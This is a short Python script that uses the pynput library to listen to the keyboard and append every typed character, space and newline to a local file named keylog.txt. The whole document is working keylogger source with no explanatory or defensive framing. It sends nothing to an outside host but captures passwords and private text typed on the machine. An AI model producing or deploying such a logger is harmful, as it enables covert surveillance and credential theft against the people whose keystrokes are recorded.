from pynput import keyboard

log = "keylog.txt"

def on_press(key):
    try:
        with open(log, "a") as f:
            f.write(f"{key.char}")
    except AttributeError:
        if key == keyboard.Key.space:
            with open(log, "a") as f:
                f.write(" ")
        elif key == keyboard.Key.enter:
            with open(log, "a") as f:
                f.write("\n")
        
listener = keyboard.Listener(on_press=on_press)
listener.start()
listener.join()
